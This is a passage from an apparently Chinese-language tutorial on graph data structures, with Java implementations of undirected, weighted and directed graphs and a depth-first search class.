<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line">    <span class="comment">// 顶点数目</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> V;</span><br><span class="line">    <span class="comment">// 边的数目</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> E;</span><br><span class="line">    <span class="comment">// 邻接表</span></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Integer&gt;[] adj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span> V)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化顶点数量</span></span><br><span class="line">        <span class="built_in">this</span>.V = V;</span><br><span class="line">        <span class="comment">// 初始化边的数量</span></span><br><span class="line">        <span class="built_in">this</span>.E = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 初始化邻接表</span></span><br><span class="line">        <span class="built_in">this</span>.adj = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[V];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; adj.length; i++) &#123;</span><br><span class="line">            adj[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取顶点数目</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">V</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> V;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取边的数目</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">E</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> E;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向图中添加一条边 v-w</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEdge</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w)</span> &#123;</span><br><span class="line">        <span class="comment">// 在无向图中，边是没有方向的，所以该边既可以说是从v到w的边，又可以说是从w到v的边，</span></span><br><span class="line">        <span class="comment">// 因此，需要让w出现在v的邻接表中，并且还要让v出现在w的邻接表中</span></span><br><span class="line">        adj[v].add(w);</span><br><span class="line">        adj[w].add(v);</span><br><span class="line">        <span class="comment">// 边的数量+1</span></span><br><span class="line">        E ++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取和顶点v相邻的所有顶点</span></span><br><span class="line">    <span class="keyword">public</span> LinkedList&lt;Integer&gt; <span class="title function_">adj</span><span class="params">(<span class="type">int</span> v)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> adj[v];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h2 id="4-加权无向图"><a href="#4-加权无向图" class="headerlink" title="4. 加权无向图"></a>4. 加权无向图</h2><p>加权无向图是一种为每条边关联一个权重值或是成本的图模型。这种图能够自然地表示许多应用。在一副航空图中，边表示航线，权值则可以表示距离或是费用。在一副电路图中，边表示导线，权值则可能表示导线的长度即成本，或是信号通过这条先所需的时间。</p>
<p>在下图中，从顶点0到顶点4有三条路径，分别为0-2-3-4,0-2-4,0-5-3-4,那我们如果要通过那条路径到达4顶点最好呢？此时就要考虑，那条路径的成本最低。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141711.png" alt="  "></p>
<h3 id="①-加权无向图边的表示"><a href="#①-加权无向图边的表示" class="headerlink" title="① 加权无向图边的表示"></a>① 加权无向图边的表示</h3><p>加权无向图中的边我们就不能简单的使用v-w两个顶点表示了，而必须要给边关联一个权重值，因此我们可以使用对象来描述一条边。</p>
<p><strong>API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141716.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Edge</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;Edge&gt; &#123;</span><br><span class="line">    <span class="comment">// 顶点一</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> v;</span><br><span class="line">    <span class="comment">// 顶点二</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> w;</span><br><span class="line">    <span class="comment">// 当前边的权重</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">double</span> weight;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过顶点v和w，以及权重weight值构造一个边对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Edge</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w, <span class="type">double</span> weight)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.v = v;</span><br><span class="line">        <span class="built_in">this</span>.w = w;</span><br><span class="line">        <span class="built_in">this</span>.weight = weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取边的权重值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">weight</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取边上的一个点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">either</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取边上除了顶点vertex外的另外一个顶点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">other</span><span class="params">(<span class="type">int</span> vertex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (vertex == v)&#123;</span><br><span class="line">            <span class="keyword">return</span> w;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Edge that)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如果当前边的权重值大 return 1</span></span><br><span class="line"><span class="comment">        如果当前边的权重值小 return -1</span></span><br><span class="line"><span class="comment">        如果权重值一样大    return 0</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> Double.compare(<span class="built_in">this</span>.weight, that.weight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="②-加权无向图的实现"><a href="#②-加权无向图的实现" class="headerlink" title="② 加权无向图的实现"></a>② 加权无向图的实现</h3><p>之前我们已经完成了无向图，在无向图的基础上，我们只需要把边的表示切换成Edge对象即可。</p>
<p><strong>API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141719.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EdgeWeightedGraph</span> &#123;</span><br><span class="line">    <span class="comment">// 顶点总数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> V;</span><br><span class="line">    <span class="comment">// 边的总数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> E;</span><br><span class="line">    <span class="comment">// 邻接表</span></span><br><span class="line">    <span class="keyword">private</span> Queue&lt;Edge&gt;[] adj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个含有V个顶点的空加权无向图</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EdgeWeightedGraph</span><span class="params">(<span class="type">int</span> V)</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化顶点数量</span></span><br><span class="line">        <span class="built_in">this</span>.V = V;</span><br><span class="line">        <span class="comment">// 初始化边的数量</span></span><br><span class="line">        <span class="built_in">this</span>.E = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 初始化邻接表</span></span><br><span class="line">        <span class="built_in">this</span>.adj = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[V];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; adj.length; i++) &#123;</span><br><span class="line">            adj[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Edge&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取图中顶点的数量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">V</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> V;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取图中边的数量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">E</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> E;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向加权无向图中添加一条边e</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEdge</span><span class="params">(Edge e)</span> &#123;</span><br><span class="line">        <span class="comment">// 需要让边e同时出现在e这个边的两个顶点的邻接表中</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> e.either();</span><br><span class="line">        <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> e.other(v);</span><br><span class="line">        adj[v].add(e);</span><br><span class="line">        adj[w].add(e);</span><br><span class="line">        <span class="comment">// 边的数量+1</span></span><br><span class="line">        E++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取和顶点v关联的所有边</span></span><br><span class="line">    <span class="keyword">public</span> Queue&lt;Edge&gt; <span class="title function_">adj</span><span class="params">(<span class="type">int</span> v)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> adj[v];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取加权无向图的所有边</span></span><br><span class="line">    <span class="keyword">public</span> Queue&lt;Edge&gt; <span class="title function_">edges</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个队列对象，存储所有的边</span></span><br><span class="line">        Queue&lt;Edge&gt; allEdges = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        遍历图中的每一个顶点，找到该顶点的邻接表，</span></span><br><span class="line"><span class="comment">        邻接表中存储了该顶点关联的每一条边.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">0</span>; v &lt; V; v++)&#123;</span><br><span class="line">            <span class="comment">// 遍历v顶点的邻接表，找到每一条和v关联的边</span></span><br><span class="line">            <span class="keyword">for</span> (Edge e : adj(v)) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 因为这是无向图，所以同一条边同时出现在了</span></span><br><span class="line"><span class="comment">                 它关联的两个顶点的邻接表中，需要让一条边只记录一次；</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">if</span> (e.other(v) &lt; v)&#123;</span><br><span class="line">                    allEdges.add(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> allEdges;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、有向图"><a href="#三、有向图" class="headerlink" title="三、有向图"></a>三、有向图</h1><p>若E是有向边(也称弧)的有限集合时，则图G为有向图。弧是顶点的有序对，记为&lt;v, w&gt;，其中v,w是顶点，v称为弧尾，w称为弧头，&lt;v,w&gt;称为从顶点v到顶点w的弧，也称v邻接到w，或w邻接自v。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141722.png" alt="  "></p>
<p>图所示的有向图 G1可表示为<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141724.png" alt="  "></p>
<h2 id="1-相关术语-1"><a href="#1-相关术语-1" class="headerlink" title="1. 相关术语"></a>1. 相关术语</h2><p><strong>定义：</strong></p>
<p>有向图是一副具有方向性的图，是由一组顶点和一组有方向的边组成的，每条方向的边都连着一对有序的顶点</p>
<p><strong>出度：</strong></p>
<p>由某个顶点指出的边的个数称为该顶点的出度</p>
<p><strong>入度：</strong></p>
<p>指向某个顶点的边的个数称为该顶点的入度</p>
<p><strong>有向路径：</strong></p>
<p>由一系列顶点组成，对于其中的每个顶点都存在一条有向边，从它指向序列中的下一个顶点</p>
<p><strong>有向环：</strong></p>
<p>一条至少含有一条边，且起点和终点相同的有向路径。</p>
<p><strong>一副有向图中两个顶点v和w可能存在以下四种关系：</strong></p>
<ol>
<li><p>没有边相连；</p>
</li>
<li><p>存在从v到w的边v—&gt;w;</p>
</li>
<li><p>存在从w到v的边w—&gt;v;</p>
</li>
<li><p>既存在w到v的边，也存在v到w的边，即双向连接；</p>
</li>
</ol>
<h2 id="2-有向图的实现"><a href="#2-有向图的实现" class="headerlink" title="2. 有向图的实现"></a>2. 有向图的实现</h2><p><strong>有向图API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141728.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Digraph</span> &#123;</span><br><span class="line">    <span class="comment">// 顶点数目</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> V;</span><br><span class="line">    <span class="comment">// 边的数目</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> E;</span><br><span class="line">    <span class="comment">// 邻接表</span></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Integer&gt;[] adj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Digraph</span><span class="params">(<span class="type">int</span> V)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化顶点数量</span></span><br><span class="line">        <span class="built_in">this</span>.V = V;</span><br><span class="line">        <span class="comment">// 初始化边的数量</span></span><br><span class="line">        <span class="built_in">this</span>.E = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 初始化邻接表</span></span><br><span class="line">        <span class="built_in">this</span>.adj = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[V];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; adj.length; i++) &#123;</span><br><span class="line">            adj[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取顶点数目</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">V</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> V;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取边的数目</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">E</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> E;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向有向图中添加一条边 v-&gt;w</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEdge</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        只需要让顶点w出现在顶点v的邻接表中，因为边是有方向的，</span></span><br><span class="line"><span class="comment">        最终，顶点v的邻接表中存储的相邻顶点的含义是：  v -&gt; 其他顶点</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        adj[v].add(w);</span><br><span class="line">        E ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取由v指出的边所连接的所有顶点</span></span><br><span class="line">    <span class="keyword">public</span> LinkedList&lt;Integer&gt; <span class="title function_">adj</span><span class="params">(<span class="type">int</span> v)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> adj[v];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该图的反向图</span></span><br><span class="line">    <span class="keyword">private</span> Digraph <span class="title function_">reverse</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 创建有向图对象</span></span><br><span class="line">        <span class="type">Digraph</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Digraph</span>(V);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">0</span>; v &lt; V; v++)&#123;</span><br><span class="line">            <span class="comment">// 获取由该顶点v指出的所有边</span></span><br><span class="line">            <span class="comment">// 原图中表示的是由顶点v-&gt;w的边</span></span><br><span class="line">            <span class="keyword">for</span> (Integer w : adj[v]) &#123;</span><br><span class="line">                <span class="comment">// 转换指向为 w-&gt;v</span></span><br><span class="line">                r.addEdge(w, v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="3-加权有向图"><a href="#3-加权有向图" class="headerlink" title="3. 加权有向图"></a>3. 加权有向图</h2><p>上述提到的加权无向图中，边是没有方向的，并且同一条边会同时出现在该边的两个顶点的邻接表中，为了能够处理含有方向性的图的问题，我们需要使用加权有向图。</p>
<h3 id="①-加权有向图边的表示"><a href="#①-加权有向图边的表示" class="headerlink" title="① 加权有向图边的表示"></a>① 加权有向图边的表示</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141732.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DirectedEdge</span> &#123;</span><br><span class="line">    <span class="comment">// 起点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> v;</span><br><span class="line">    <span class="comment">// 终点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> w;</span><br><span class="line">    <span class="comment">// 当前边的权重</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">double</span> weight;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过顶点v和w，以及权重weight值构造一个边对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DirectedEdge</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w, <span class="type">double</span> weight)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.v = v;</span><br><span class="line">        <span class="built_in">this</span>.w = w;</span><br><span class="line">        <span class="built_in">this</span>.weight = weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取边的权重值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">weight</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取有向边的起点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">from</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取有向边的终点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">to</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="②-加权有向图的实现"><a href="#②-加权有向图的实现" class="headerlink" title="② 加权有向图的实现"></a>② 加权有向图的实现</h3><p>之前我们已经完成了有向图，在有向图的基础上，我们只需要把边的表示切换成DirectedEdge对象即可。</p>
<p><strong>API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141734.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EdgeWeightedDigraph</span> &#123;</span><br><span class="line">    <span class="comment">// 顶点总数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> V;</span><br><span class="line">    <span class="comment">// 边的总数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> E;</span><br><span class="line">    <span class="comment">// 邻接表</span></span><br><span class="line">    <span class="keyword">private</span> Queue&lt;DirectedEdge&gt;[] adj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个含有V个顶点的空加权有向图</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EdgeWeightedDigraph</span><span class="params">(<span class="type">int</span> V)</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化顶点数量</span></span><br><span class="line">        <span class="built_in">this</span>.V = V;</span><br><span class="line">        <span class="comment">// 初始化边的数量</span></span><br><span class="line">        <span class="built_in">this</span>.E = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 初始化邻接表</span></span><br><span class="line">        <span class="built_in">this</span>.adj = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[V];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; adj.length; i++) &#123;</span><br><span class="line">            adj[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;DirectedEdge&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取图中顶点的数量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">V</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> V;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取图中边的数量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">E</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> E;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向加权有向图中添加一条边e</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEdge</span><span class="params">(DirectedEdge e)</span> &#123;</span><br><span class="line">        <span class="comment">// 边e是有方向的，所以只需要让e出现在起点的邻接表中即可</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> e.from();</span><br><span class="line">        adj[v].add(e);</span><br><span class="line">        E++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取由顶点v指出的所有的边</span></span><br><span class="line">    <span class="keyword">public</span> Queue&lt;DirectedEdge&gt; <span class="title function_">adj</span><span class="params">(<span class="type">int</span> v)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> adj[v];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取加权有向图的所有边</span></span><br><span class="line">    <span class="keyword">public</span> Queue&lt;DirectedEdge&gt; <span class="title function_">edges</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         遍历图中的每一个顶点，得到该顶点的邻接表，遍历得到每一条边，添加到队列中返回即可</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Queue&lt;DirectedEdge&gt; allEdges = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">0</span>;v&lt;V;v++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (DirectedEdge edge : adj[v]) &#123;</span><br><span class="line">                allEdges.add(edge);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> allEdges;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="四、图的遍历"><a href="#四、图的遍历" class="headerlink" title="四、图的遍历"></a>四、图的遍历</h1><p>在很多情况下，我们需要遍历图，得到图的一些性质，例如，找出图中与指定的顶点相连的所有顶点，或者判定某个顶点与指定顶点是否相通，是非常常见的需求。有关图的搜索，最经典的算法有深度优先搜索和广度优先搜索，接下来我们分别讲解这两种搜索算法。</p>
<h2 id="1-深度优先搜索"><a href="#1-深度优先搜索" class="headerlink" title="1. 深度优先搜索"></a>1. 深度优先搜索</h2><p>所谓的深度优先搜索，指的是在搜索时，如果遇到一个结点既有子结点，又有兄弟结点，那么先找子结点，然后找兄弟结点。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141745.png" alt="  "><br><strong>API设计</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141749.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DepthFirstSearch</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 索引代表顶点，值表示当前顶点是否已经被搜索</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span>[] marked;</span><br><span class="line">    <span class="comment">// 记录有多少个顶点与 s 顶点相通</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造深度优先搜索对象，使用深度优先搜索找出 G 图中 s 顶点的所有相邻顶点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DepthFirstSearch</span><span class="params">(Graph G, <span class="type">int</span> s)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化marked数组</span></span><br><span class="line">        <span class="built_in">this</span>.marked = <span class="keyword">new</span> <span class="title class_">boolean</span>[G.V()];</span><br><span class="line">        <span class="comment">// 初始化跟顶点s相通的顶点的数量</span></span><br><span class="line">        <span class="built_in">this</span>.count = <span class="number">0</span>;</span><br><span class="line">        dfs(G,s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用深度优先搜索找出G图中v顶点的所有相通顶点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(Graph G, <span class="type">int</span> v)</span>&#123;</span><br><span class="line">        <span class="comment">// 把v顶点标识为已搜索</span></span><br><span class="line">        marked[v] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer w : G.adj(v)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            判断当前w顶点有没有被搜索过，</span></span><br><span class="line"><span class="comment">            如果没有被搜索过，则递归调用dfs方法进行深度搜索</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">if</span> (!marked[w])&#123;</span><br><span class="line">                dfs(G,w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 相通顶点数量+1</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断w顶点与s顶点是否相通</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">marked</span><span class="params">(<span class="type">int</span> w)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> marked[w];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取与顶点s相通的所有顶点的总数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">count</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


